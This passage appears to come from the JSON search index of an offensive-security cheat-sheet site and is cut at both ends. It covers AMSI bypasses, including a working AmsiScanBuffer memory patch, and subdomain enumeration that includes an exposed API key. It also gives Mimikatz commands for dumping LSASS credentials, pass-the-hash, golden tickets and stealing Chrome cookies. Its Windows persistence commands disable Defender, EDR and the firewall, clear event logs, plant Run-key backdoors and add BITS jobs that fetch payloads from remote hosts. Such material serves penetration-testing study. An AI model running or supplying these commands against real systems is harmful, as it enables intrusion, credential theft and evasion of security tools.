]\u0026#39;+\u0026#39;feR[\u0026#39;( (noisserpxE-ekovnI\u0026#34; ); Invoke-Expression( -Join ( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val )[ - 1..- (( VaRIAbLe (\u0026#39;R9\u0026#39;+\u0026#39;hyT\u0026#39;) -val ).Length)]) } } \u0026#34;unload2\u0026#34; { Write-Verbose \u0026#34;Using Matt Graeber\u0026#39;s second Reflection method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Use the following scriptblock before you run a script which gets detected.\u0026#34; Write-Output \u0026#39;[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(\u0026#39;\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;\u0026#39;).GetField(\u0026#39;\u0026#39;amsiContext\u0026#39;\u0026#39;,[Reflection.BindingFlags]\u0026#39;\u0026#39;NonPublic,Static\u0026#39;\u0026#39;).GetValue($null),0x41414141)\u0026#39; } else { Write-Output \u0026#34;Executing the bypass.\u0026#34; [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(\u0026#39;System.Management.Automation.AmsiUtils\u0026#39;).GetField(\u0026#39;amsiContext\u0026#39;,[Reflection.BindingFlags]\u0026#39;NonPublic,Static\u0026#39;).GetValue($null),0x41414141) } } \u0026#34;dllhijack\u0026#34; { Write-Verbose \u0026#34;Using Cornelis de Plaa\u0026#39;s DLL hijack method.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\u0026#34; Write-Output \u0026#34;Run the new powershell.exe and AMSI should be gone for that session.\u0026#34; } else { [Byte[]] $temp = $DllBytes -split \u0026#39; \u0026#39; Write-Output \u0026#34;Executing the bypass.\u0026#34; Write-Verbose \u0026#34;Dropping the fake amsi.dll to disk.\u0026#34; [System.IO.File]::WriteAllBytes(\u0026#34;$pwd\\amsi.dll\u0026#34;, $temp) Write-Verbose \u0026#34;Copying powershell.exe to the current working directory.\u0026#34; Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \u0026#34;Starting powershell.exe from the current working directory.\u0026#34; \u0026amp; \u0026#34;$pwd\\powershell.exe\u0026#34; } } \u0026#34;psv2\u0026#34; { Write-Verbose \u0026#34;Using PowerShell version 2 which doesn\u0026#39;t support AMSI.\u0026#34; if ($ShowOnly -eq $True) { Write-Output \u0026#34;If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\u0026#34; } else { Write-Verbose \u0026#34;Checking if .Net version 2.0.50727 is installed.\u0026#34; $versions = Get-ChildItem \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026#39; -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match \u0026#39;^(?!S)\\p{L}\u0026#39;} | Select -ExpandProperty Version if($versions -match \u0026#34;2.0.50727\u0026#34;) { Write-Verbose \u0026#34;.Net version 2.0.50727 found.\u0026#34; Write-Output \u0026#34;Executing the bypass.\u0026#34; powershell.exe -version 2 } else { Write-Verbose \u0026#34;.Net version 2.0.50727 not found. Can\u0026#39;t start PowerShell v2.\u0026#34; } } } \u0026#34;obfuscation\u0026#34; { Write-Output \u0026#34;AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\u0026#34; Write-Output \u0026#34;ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\u0026#34; } } } Adam Chester Patch # Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530\n$Winpatch = @\u0026#34; using System; using System.Runtime.InteropServices; public class patch { // https://twitter.com/_xpn_/status/1170852932650262530 static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; public static void it() { if (is64Bit()) PatchAmsi(x64); else PatchAmsi(x86); } private static void PatchAmsi(byte[] patch) { try { var lib = Win32.LoadLibrary(\u0026#34;a\u0026#34; + \u0026#34;ms\u0026#34; + \u0026#34;i.dll\u0026#34;); var addr = Win32.GetProcAddress(lib, \u0026#34;AmsiScanBuffer\u0026#34;); uint oldProtect; Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect); Marshal.Copy(patch, 0, addr, patch.Length); Console.WriteLine(\u0026#34;Patch Sucessfull\u0026#34;); } catch (Exception e) { Console.WriteLine(\u0026#34; [x] {0}\u0026#34;, e.Message); Console.WriteLine(\u0026#34; [x] {0}\u0026#34;, e.InnerException); } } private static bool is64Bit() { bool is64Bit = true; if (IntPtr.Size == 4) is64Bit = false; return is64Bit; } } class Win32 { [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \u0026#34;@ Add-Type -TypeDefinition $Winpatch -Language CSharp [patch]::it() AMSI.fail # AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/\nReferences # S3cur3Th1sSh1t - Amsi-Bypass-Powershell "},{"id":8,"href":"/docs/subdomains_enumeration/","title":"Enumerating Subdomains","section":"Docs","content":" Subdomains Enumeration # Enumerate all subdomains (only if the scope is *.domain.ext) # Using Subbrute # git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com Using KnockPy with Daniel Miessler’s SecLists for subdomain \u0026ldquo;/Discover/DNS\u0026rdquo; # git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans\ngit clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.xml -t 8 --headless ./EyeWitness -f rdp.txt --rdp Using Google Dorks and Google Transparency Report # You need to include subdomains ;) https://www.google.com/transparencyreport/https/ct/?hl=en-US#domain=[DOMAIN]g\u0026incl_exp=true\u0026incl_sub=true\nsite:*.domain.com -www site:domain.com filetype:pdf site:domain.com inurl:\u0026#39;\u0026amp;\u0026#39; site:domain.com inurl:login,register,upload,logout,redirect,redir,goto,admin site:domain.com ext:php,asp,aspx,jsp,jspa,txt,swf site:*.*.domain.com Using Sublist3r # To enumerate subdomains of specific domain and show the results in realtime: python sublist3r.py -v -d example.com To enumerate subdomains and enable the bruteforce module: python sublist3r.py -b -d example.com To enumerate subdomains and use specific engines such Google, Yahoo and Virustotal engines python sublist3r.py -e google,yahoo,virustotal -d example.com python sublist3r.py -b -d example.com Using Subfinder # go get github.com/subfinder/subfinder ./Subfinder/subfinder --set-config PassivetotalUsername=\u0026#39;USERNAME\u0026#39;,PassivetotalKey=\u0026#39;KEY\u0026#39; ./Subfinder/subfinder --set-config RiddlerEmail=\u0026#34;EMAIL\u0026#34;,RiddlerPassword=\u0026#34;PASSWORD\u0026#34; ./Subfinder/subfinder --set-config CensysUsername=\u0026#34;USERNAME\u0026#34;,CensysSecret=\u0026#34;SECRET\u0026#34; ./Subfinder/subfinder --set-config SecurityTrailsKey=\u0026#39;KEY\u0026#39; ./Subfinder/subfinder -d example.com -o /tmp/results_subfinder.txt Using Findomain # $ wget https://github.com/Edu4rdSHL/findomain/releases/latest/download/findomain-linux $ chmod +x findomain-linux $ findomain_spyse_token=\u0026#34;YourAccessToken\u0026#34; $ findomain_virustotal_token=\u0026#34;YourAccessToken\u0026#34; $ findomain_fb_token=\u0026#34;YourAccessToken\u0026#34; $ ./findomain-linux -t example.com -o Using Aquatone - old version (Ruby) # gem install aquatone Discover subdomains : results in ~/aquatone/example.com/hosts.txt aquatone-discover --domain example.com aquatone-discover --domain example.com --threads 25 aquatone-discover --domain example.com --sleep 5 --jitter 30 aquatone-discover --set-key shodan o1hyw8pv59vSVjrZU3Qaz6ZQqgM91ihQ Active scans : results in ~/aquatone/example.com/urls.txt aquatone-scan --domain example.com aquatone-scan --domain example.com --ports 80,443,3000,8080 aquatone-scan --domain example.com --ports large aquatone-scan --domain example.com --threads 25 Final results aquatone-gather --domain example.com Alternatively, you can use the Docker image provided by txt3rob.\nhttps://hub.docker.com/r/txt3rob/aquatone-docker/ docker pull txt3rob/aquatone-docker docker run -it txt3rob/aquatone-docker aq example.com Using Aquatone - new version (Go) # # Subfinder version ./Subfinder/subfinder -d $1 -r 8.8.8.8,1.1.1.1 -nW -o /tmp/subresult$1 cat /tmp/subresult$1 | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1 # Amass version ./Amass/amass -active -brute -o /tmp/hosts.txt -d $1 cat /tmp/hosts.txt | ./Aquatone/aquatone -ports large -out /tmp/aquatone$1 Using AltDNS # It\u0026rsquo;s recommended to use massdns in order to resolve the result of AltDNS\nWORDLIST_PERMUTATION=\u0026#34;./Altdns/words.txt\u0026#34; python2.7 ./Altdns/altdns.py -i /tmp/inputdomains.txt -o /tmp/out.txt -w $WORDLIST_PERMUTATION Alternatively you can use goaltdns\nUsing MassDNS # DNS_RESOLVERS=\u0026#34;./resolvers.txt\u0026#34; cat /tmp/results_subfinder.txt | massdns -r $DNS_RESOLVERS -t A -o S -w /tmp/results_subfinder_resolved.txt Using Nmap # nmap -sn --script hostmap-crtsh host_to_scan.tld Subdomain take over # Check Can I take over xyz by EdOverflow for a list of services and how to claim (sub)domains with dangling DNS records.\nUsing tko-subs # go get github.com/anshumanbh/tko-subs ./bin/tko-subs -domains=./lists/domains_tkos.txt -data=./lists/providers-data.csv Using HostileSubBruteForcer # git clone https://github.com/nahamsec/HostileSubBruteforcer chmod +x sub_brute.rb ./sub_brute.rb Using SubOver # go get github.com/Ice3man543/SubOver ./SubOver -l subdomains.txt References # Subdomain Takeover: Proof Creation for Bug Bounties - Patrik Hudak Subdomain Takeover: Basics - Patrik Hudak "},{"id":9,"href":"/docs/windows_mimikatz/","title":"Windows - Mimikatz","section":"Docs","content":" Windows - Mimikatz # Mimikatz - Execute commands # Only one command\nPS C:\\temp\\mimikatz\u0026gt; .\\mimikatz \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34; exit Mimikatz console (multiple commands)\nPS C:\\temp\\mimikatz\u0026gt; .\\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest Mimikatz - Extract passwords # Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.\nmimikatz_command -f sekurlsa::logonPasswords full mimikatz_command -f sekurlsa::wdigest # to re-enable wdigest in Windows Server 2012+ # in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest # create a DWORD \u0026#39;UseLogonCredential\u0026#39; with the value 1. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1 :warning: To take effect, conditions are required :\nWin7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2: Adding requires lock Removing requires signout Win10: Adding requires signout Removing requires signout Win2016: Adding requires lock Removing requires reboot Mimikatz - LSA Protection Workaround # LSA as a Protected Process (RunAsPPL)\n# Check if LSA runs as a protected process by looking if the variable \u0026#34;RunAsPPL\u0026#34; is set to 0x1 reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe # Now lets import the mimidriver.sys to the system mimikatz # !+ # Now lets remove the protection flags from lsass.exe process mimikatz # !processprotect /process:lsass.exe /remove # Finally run the logonpasswords function to dump lsass mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords # Now lets re-add the protection flags to the lsass.exe process mimikatz # !processprotect /process:lsass.exe # Unload the service created mimikatz # !- # https://github.com/itm4n/PPLdump PPLdump.exe [-v] [-d] [-f] \u0026lt;PROC_NAME|PROC_ID\u0026gt; \u0026lt;DUMP_FILE\u0026gt; PPLdump.exe lsass.exe lsass.dmp PPLdump.exe -v 720 out.dmp LSA is running as virtualized process (LSAISO) by Credential Guard\n# Check if a process called lsaiso.exe exists on the running processes tasklist |findstr lsaiso # Lets inject our own malicious Security Support Provider into memory # require mimilib.dll in the same folder mimikatz # misc::memssp # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log Mimikatz - Mini Dump # Dump the lsass process with procdump\nWindows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass\u0026rsquo;s process identifier (pid) \u0026ldquo;bypasses\u0026rdquo; that.\n# HTTP method - using the default way certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\\Users\\Public\\procdump.exe C:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp # SMB method - using the pid net use Z: https://live.sysinternals.com tasklist /fi \u0026#34;imagename eq lsass.exe\u0026#34; # Find lsass\u0026#39;s pid Z:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp Dump the lsass process with rundll32\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full Then load it inside Mimikatz.\nmimikatz # sekurlsa::minidump lsass.dmp Switch to minidump mimikatz # sekurlsa::logonPasswords Mimikatz - Pass The Hash # mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell Mimikatz - Golden ticket # .\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt .\\mimikatz \u0026#34;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt\u0026#34; exit Mimikatz - Skeleton key # privilege::debug misc::skeleton # map the share net use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz # login as someone rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab Mimikatz - RDP session takeover # Use ts::multirdp to patch the RDP service to allow more than two users.\nRun tscon.exe as the SYSTEM user, you can connect to any session without a password.\nprivilege::debug token::elevate ts::remote /id:2 # get the Session ID you want to hijack query user create sesshijack binpath= \u0026#34;cmd.exe /k tscon 1 /dest:rdp-tcp#55\u0026#34; net start sesshijack Mimikatz - Credential Manager \u0026amp; DPAPI # # check the folder to find credentials dir C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\* # check the file with mimikatz $ mimikatz dpapi::cred /in:C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 # find master key $ mimikatz !sekurlsa::dpapi # use master key $ mimikatz dpapi::cred /in:C:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b Chrome Cookies \u0026amp; Credential # # Saved Cookies dpapi::chrome /in:\u0026#34;%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\u0026#34; /unprotect dpapi::chrome /in:\u0026#34;C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\u0026#34; /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b # Saved Credential in Chrome dpapi::chrome /in:\u0026#34;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\u0026#34; /unprotect Task Scheduled credentials # mimikatz(commandline) # vault::cred /patch TargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / \u0026lt;NULL\u0026gt; UserName : DOMAIN\\user Comment : \u0026lt;NULL\u0026gt; Type : 2 - domain_password Persist : 2 - local_machine Flags : 00004004 Credential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Attributes : 0 Vault # vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\u0026#34; Mimikatz - Commands list # Command Definition CRYPTO::Certificates list/export certificates CRYPTO::Certificates list/export certificates KERBEROS::Golden create golden/silver/trust tickets KERBEROS::List list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”. KERBEROS::PTT pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). LSADUMP::DCSync ask a DC to synchronize an object (get password data for account). No need to run code on DC. LSADUMP::LSA Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt” LSADUMP::SAM get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. LSADUMP::Trust Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). MISC::AddSid Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Debug get debug rights (this or Local System rights is required for many Mimikatz commands). SEKURLSA::Ekeys list Kerberos encryption keys SEKURLSA::Kerberos List Kerberos credentials for all authenticated users (including services and computer account) SEKURLSA::Krbtgt get Domain Kerberos service account (KRBTGT)password data SEKURLSA::LogonPasswords lists all available provider credentials. This usually shows recently logged on user and computer credentials. SEKURLSA::Pth Pass- theHash and Over-Pass-the-Hash SEKURLSA::Tickets Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). TOKEN::List list all tokens of the system TOKEN::Elevate impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box TOKEN::Elevate /domainadmin impersonate a token with Domain Admin credentials. Mimikatz - Powershell version # Mimikatz in memory (no binary on disk) with :\nInvoke-Mimikatz from PowerShellEmpire Invoke-Mimikatz from PowerSploit More information can be grabbed from the Memory with :\nInvoke-Mimikittenz References # Unofficial Guide to Mimikatz \u0026amp; Command Reference Skeleton Key Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH "},{"id":10,"href":"/docs/windows_persistence/","title":"Windows - Persistence","section":"Docs","content":" Windows - Persistence # Tools # SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r Hide Your Binary # Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.\nPS\u0026gt; attrib +h mimikatz.exe Disable Antivirus and Security # Antivirus Removal # Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security cd \u0026#34;C:\\Program Files\\Elastic\\Agent\\\u0026#34; PS C:\\Program Files\\Elastic\\Agent\u0026gt; .\\elastic-agent.exe uninstall Elastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y Elastic Agent has been uninstalled. Cortex XDR # Global uninstall password: Password1 Password hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db Look for PasswordHash, PasswordSalt or password, salt strings. # Disable Cortex: Change the DLL to a random value, then REBOOT reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f # Disables the agent on startup (requires reboot to work) cytool.exe startup disable # Disables protection on Cortex XDR files, processes, registry and services cytool.exe protect disable # Disables Cortex XDR (Even with tamper protection enabled) cytool.exe runtime disable # Disables event collection cytool.exe event_collection disable Disable Windows Defender # # Disable Defender sc config WinDefend start= disabled sc stop WinDefend Set-MpPreference -DisableRealtimeMonitoring $true ## Exclude a process / location Set-MpPreference -ExclusionProcess \u0026#34;word.exe\u0026#34;, \u0026#34;vmwp.exe\u0026#34; Add-MpPreference -ExclusionProcess \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; Add-MpPreference -ExclusionPath C:\\Video, C:\\install # Disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\\u0026gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\\u0026gt; Set-MpPreference -DisableIOAVProtection $true # Disable AMSI (set to 0 to enable) PS C:\\\u0026gt; Set-MpPreference -DisableScriptScanning 1 # Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions reg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\u0026#34; /v \u0026#34;Start\u0026#34; /t REG_DWORD /d \u0026#34;0\u0026#34; /f # Wipe currently stored definitions # Location of MpCmdRun.exe: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\u0026lt;antimalware platform version\u0026gt; MpCmdRun.exe -RemoveDefinitions -All # Remove signatures (if Internet connection is present, they will be downloaded again): PS \u0026gt; \u0026amp; \u0026#34;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All PS \u0026gt; \u0026amp; \u0026#34;C:\\Program Files\\Windows Defender\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All # Disable Windows Defender Security Center reg add \u0026#34;HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\u0026#34; /v \u0026#34;Start\u0026#34; /t REG_DWORD /d \u0026#34;4\u0026#34; /f # Disable Real Time Protection reg delete \u0026#34;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\u0026#34; /f reg add \u0026#34;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\u0026#34; /v \u0026#34;DisableAntiSpyware\u0026#34; /t REG_DWORD /d \u0026#34;1\u0026#34; /f reg add \u0026#34;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\u0026#34; /v \u0026#34;DisableAntiVirus\u0026#34; /t REG_DWORD /d \u0026#34;1\u0026#34; /f Disable Windows Firewall # Netsh Advfirewall show allprofiles NetSh Advfirewall set allprofiles state off # ip whitelisting New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP Clear System and Security Logs # cmd.exe /c wevtutil.exe cl System cmd.exe /c wevtutil.exe cl Security Simple User # Set a file as hidden\nattrib +h c:\\autoexec.bat Registry HKCU # Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows.\nValue name: Backdoor Value data: C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using the command line\nreg add \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\Users\\user\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\Users\\user\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\Users\\user\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\Users\\user\\backdoor.exe\u0026#34; Using SharPersist\nSharPersist -t reg -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -k \u0026#34;hkcurun\u0026#34; -v \u0026#34;Test Stuff\u0026#34; -m add SharPersist -t reg -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -k \u0026#34;hkcurun\u0026#34; -v \u0026#34;Test Stuff\u0026#34; -m add -o env SharPersist -t reg -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -k \u0026#34;logonscript\u0026#34; -m add Startup # Create a batch script in the user startup folder.\nPS C:\\\u0026gt; gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat start /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using SharPersist\nSharPersist -t startupfolder -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -f \u0026#34;Some File\u0026#34; -m add Scheduled Tasks User # Using native schtask - Create a new task\n# Create the scheduled tasks to run once at 00.00 schtasks /create /sc ONCE /st 00:00 /tn \u0026#34;Device-Synchronize\u0026#34; /tr C:\\Temp\\revshell.exe # Force run it now ! schtasks /run /tn \u0026#34;Device-Synchronize\u0026#34; Using native schtask - Leverage the schtasks /change command to modify existing scheduled tasks\n# Launch an executable by calling the ShellExec_RunDLL function. SCHTASKS /Change /tn \u0026#34;\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\u0026#34; /TR \u0026#34;C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\u0026#34; /RL HIGHEST /RU \u0026#34;\u0026#34; /ENABLE Using Powershell\nPS C:\\\u0026gt; $A = New-ScheduledTaskAction -Execute \u0026#34;cmd.exe\u0026#34; -Argument \u0026#34;/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\u0026#34; PS C:\\\u0026gt; $T = New-ScheduledTaskTrigger -AtLogOn -User \u0026#34;Rasta\u0026#34; PS C:\\\u0026gt; $P = New-ScheduledTaskPrincipal \u0026#34;Rasta\u0026#34; PS C:\\\u0026gt; $S = New-ScheduledTaskSettingsSet PS C:\\\u0026gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\\\u0026gt; Register-ScheduledTask Backdoor -InputObject $D Using SharPersist\n# Add to a current scheduled task SharPersist -t schtaskbackdoor -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Something Cool\u0026#34; -m add # Add new task SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add SharPersist -t schtask -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Task\u0026#34; -m add -o hourly BITS Jobs # bitsadmin /create backdoor bitsadmin /addfile backdoor \u0026#34;http://10.10.10.10/evil.exe\u0026#34; \u0026#34;C:\\tmp\\evil.exe\u0026#34; # v1 bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\evil.exe NUL bitsadmin /SetMinRetryDelay \u0026#34;backdoor\u0026#34; 60 bitsadmin /resume backdoor # v2 - exploit/multi/script/web_delivery bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \u0026#34;/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\u0026#34; bitsadmin /resume backdoor Serviceland # IIS # IIS Raid – Backdooring IIS Using Native Modules\n$ git clone https://github.com/0x09AL/IIS-Raid $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS C:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:Module Name /image:\u0026#34;%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\u0026#34; /add:true Windows Service # Using SharPersist\nSharPersist -t service -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c calc.exe\u0026#34; -n \u0026#34;Some Service\u0026#34; -m add Elevated # Registry HKLM # Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows.\nValue name: Backdoor Value data: C:\\Windows\\Temp\\backdoor.exe Using the command line\nreg add \u0026#34;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\tmp\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026#34; /v Evil /t 